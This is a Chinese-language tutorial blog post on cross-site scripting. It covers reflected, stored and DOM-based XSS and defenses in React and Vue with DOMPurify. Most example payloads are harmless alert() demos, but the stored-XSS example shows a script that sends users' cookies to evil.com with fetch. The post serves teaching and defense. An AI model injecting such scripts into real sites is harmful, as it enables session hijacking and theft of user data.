---
title: XSS攻击
tags:
  - 安全
  - XSS
categories:
  - 安全
date: 2025-12-06 21:18:21
---

**XSS攻击**（Cross-Site Scripting，跨站脚本攻击）是一种常见的网页安全漏洞，攻击者通过向网页注入恶意脚本代码（通常是JavaScript），使得其他访问该网页的用户在浏览器中执行这些恶意脚本，从而窃取用户信息、劫持会话、篡改网页内容等。

---

## 一、XSS攻击的分类

1. **反射型XSS（Reflected XSS）**  
   恶意脚本作为请求参数被服务器“反射”回响应页面，立即执行。通常通过构造恶意链接诱导用户点击。

2. **存储型XSS（Stored XSS）**  
   恶意脚本被存储在服务器（数据库、留言板、评论区等），当其他用户访问相关页面时，脚本被执行。

3. **DOM型XSS（DOM-based XSS）**  
   脚本注入完全在客户端DOM操作中发生，服务器端无直接参与，通常是客户端JavaScript处理不当导致。

---

## 二、详细例子说明

### 1. 反射型XSS示例

假设有一个网站搜索功能，URL如下：

```
http://example.com/search?q=keyword
```

后端代码把`q`参数直接放入页面，没有做任何过滤：

```html
<html>
  <body>
    <h1>Search results for: keyword</h1>
    <!-- 这里keyword是用户输入q参数的内容 -->
  </body>
</html>
```

攻击者构造恶意链接：

```
http://example.com/search?q=<script>alert('XSS')</script>
```

当受害者点击该链接时，页面中执行了：

```html
<h1>Search results for: <script>alert('XSS')</script></h1>
```

浏览器执行`alert('XSS')`，弹出对话框，说明成功执行了恶意脚本。

---

### 2. 存储型XSS示例

假设某论坛允许用户发表帖子，帖子内容直接存数据库，没有对输入做过滤。

攻击者发帖内容：

```html
Hello, this is a normal post.<script>fetch('http://evil.com/steal?cookie=' + document.cookie);</script>
```

其他用户打开帖子时，浏览器执行这段脚本，攻击者通过`fetch`将用户cookie发送到自己的服务器，实现信息窃取。

---

### 3. DOM型XSS示例

网页有一段JavaScript，读取URL参数并写入页面：

```javascript
var msg = location.hash.substring(1);
document.getElementById('msg').innerHTML = msg;
```

攻击者构造链接：

```
http://example.com/page.html#<img src=x onerror=alert('XSS')>
```

页面会在`msg`元素中插入恶意图片标签，执行`onerror`事件，弹出alert。

---

## 三、XSS攻击的危害

- **窃取用户Cookie、会话信息**，实现账户劫持。  
- **盗取用户敏感数据**，如输入的表单内容。  
- **篡改网页内容**，误导用户。  
- **传播恶意蠕虫**，利用XSS自动传播。  
- **钓鱼攻击**，伪造页面骗取用户信息。

---

## 四、防护措施

- **输入过滤和输出编码**：对用户输入进行严格过滤，对输出进行HTML/JavaScript编码。  
- **使用安全的模板引擎**，避免直接拼接HTML。  
- **设置Content Security Policy（CSP）**，限制可执行脚本来源。  
- **HttpOnly和Secure Cookie**，防止脚本窃取Cookie。  
- **定期安全检测**，使用自动化工具扫描XSS漏洞。

---

# 总结

XSS攻击是通过网页注入恶意脚本，利用浏览器执行权限攻击用户的行为。它广泛存在于输入未正确过滤的网页中，攻击方式多样，危害严重。理解XSS攻击类型及防护方法，对保障Web安全至关重要。



在现代前端框架如 React 和 Vue 中，防止 XSS 攻击是非常重要的安全措施。两者都有内置机制来帮助开发者避免XSS，但仍需注意一些细节和最佳实践。

---

## 一、React 中如何避免 XSS 攻击

### 1. 默认的自动转义机制

- React 默认对 JSX 中的变量内容进行**HTML转义**，防止恶意脚本执行。  
- 例如：

```jsx
const userInput = '<script>alert("XSS")</script>';
return <div>{userInput}</div>;
```

渲染结果页面会显示字符串内容，而不会执行脚本。

### 2. 避免使用 `dangerouslySetInnerHTML`

- React 提供 `dangerouslySetInnerHTML` 用于插入原生HTML，**使用时必须非常小心**。  
- 如果插入的HTML来自不可信的用户输入，极易导致XSS。

```jsx
// 不安全，除非html内容经过严格清理
<div dangerouslySetInnerHTML={{ __html: userInput }} />
```

**防范措施：**  
- 尽量避免使用。  
- 如果必须用，确保对插入的HTML进行严格的白名单过滤和消毒（可用库如 DOMPurify）。

### 3. 事件处理函数安全

- React事件绑定不会执行字符串形式的代码，只会调用函数，不存在内联JS执行的风险。

---

## 二、Vue 中如何避免 XSS 攻击

### 1. 模板的自动转义

- Vue 模板中插值表达式（`{{ }}`）默认对内容进行HTML转义，防止XSS。

```vue
<template>
  <div>{{ userInput }}</div>
</template>
```

即使 `userInput` 是 `<script>alert(1)</script>`，也会被转义成普通文本。

### 2. 谨慎使用 `v-html`

- `v-html` 指令允许插入原生HTML，存在XSS风险。

```vue
<div v-html="rawHtml"></div>
```

**防范措施：**  
- 避免直接绑定不可信内容。  
- 如果必须使用，先用安全库（如 DOMPurify）清理HTML。

### 3. 事件绑定安全

- Vue事件绑定不会执行字符串代码，绑定的是函数引用，不存在内联脚本执行。

---

## 三、通用防护建议

1. **永远不要信任用户输入**，无论是React还是Vue，任何直接插入HTML的地方都必须清理。  
2. **使用安全库清理HTML**，推荐使用 [DOMPurify](https://github.com/cure53/DOMPurify) 等成熟库。  
3. **内容安全策略（CSP）** 配合框架使用，限制脚本来源，增加防护层。  
4. **后端也要做输入验证和输出编码**，前后端协同防护。

---

## 四、简单示例

### React + DOMPurify

```jsx
import DOMPurify from 'dompurify';

function MyComponent({ userInputHtml }) {
  const cleanHtml = DOMPurify.sanitize(userInputHtml);

  return <div dangerouslySetInnerHTML={{ __html: cleanHtml }} />;
}
```

### Vue + DOMPurify

```vue
<template>
  <div v-html="cleanHtml"></div>
</template>

<script>
import DOMPurify from 'dompurify';

export default {
  props: ['userInputHtml'],
  computed: {
    cleanHtml() {
      return DOMPurify.sanitize(this.userInputHtml);
    }
  }
}
</script>
```

---

# 总结

| 框架  | 默认机制     | 风险点                    | 防护建议              |
| ----- | ------------ | ------------------------- | --------------------- |
| React | JSX自动转义  | `dangerouslySetInnerHTML` | 避免或用DOMPurify清理 |
| Vue   | 模板自动转义 | `v-html`                  | 避免或用DOMPurify清理 |

通过合理利用框架自带的自动转义机制，避免直接插入原生HTML，并结合安全库清理和安全策略，可以有效防止XSS攻击。